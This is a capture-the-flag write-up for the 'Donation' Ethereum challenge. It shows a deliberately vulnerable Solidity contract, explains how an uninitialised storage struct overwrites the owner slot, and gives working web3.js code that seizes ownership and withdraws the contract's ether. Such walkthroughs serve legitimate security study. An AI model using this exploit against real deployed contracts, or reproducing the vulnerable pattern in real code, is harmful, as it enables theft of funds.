# 13. Donation

A candidate you don’t like is accepting campaign contributions via the smart contract below.

To complete this challenge, steal the candidate’s ether.

## Target contract

```solidity
pragma solidity ^0.4.21;

contract DonationChallenge {
    struct Donation {
        uint256 timestamp;
        uint256 etherAmount;
    }
    Donation[] public donations;

    address public owner;

    function DonationChallenge() public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }

    function withdraw() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}
```

## Vulnerability

The vulnerability is at `Donation donation;`. Remember that `Donation` is a struct type so bounded to storage or memory, the default location is storage.
You'll notice that the `donation` variable is not initialized, which means that its slot is not initialized neither.. given that variables default to a value of 0 in solidity you'll understand that the slot pointed to by `donation` is actually slot 0.

The struct type `Donation` contains two `uint256`, so it is spanning 2 storage slot. The member `etherAmount` of `donation` is therefore bounded to slot 1, shich hold the `owner` state variable.

We must therefore send an `etherAmount` equal to our personal address. The contract is made in such a way that we don't need to send that much Ethereum as our required `msg.value` is `etherAmount / 10^36`.

My testnet address is : `0xE613c2d3D36A7934589BC393119eD33Ac165A596`, the associated `msg.value` is therefore : `0xE613c2d3D36A7934589BC393119eD33Ac165A596 / 10 ** 36`.

```js
const challengeContract = "0x5cFe6FE7292e940F47f856958E9068083242181c";

const value = web3.utils
  .toBN(accounts[0])
  .div(new web3.utils.BN("10").pow(new web3.utils.BN("36")));

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "donate",
    type: "function",
    inputs: [{ type: "uint256", name: "etherAmount" }],
  },
  [accounts[0]]
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
  value: value,
});
```

You can check that you do have ownership by reading storage slot 1 or calling `owner()` :

```js
console.log(await web3.eth.getStorageAt(challengeContract, 1));
// prints : 0x000000000000000000000000YOUR-ADDRESS-IS-HERE
```

Now that we are the owner, we can withdraw everything :

```js
const challengeContract = "0x5cFe6FE7292e940F47f856958E9068083242181c";

const data = web3.eth.abi.encodeFunctionCall(
  {
    name: "withdraw",
    type: "function",
    inputs: [],
  },
  []
);

await web3.eth.sendTransaction({
  from: accounts[0],
  to: challengeContract,
  data: data,
});
```

And submit the challenge.
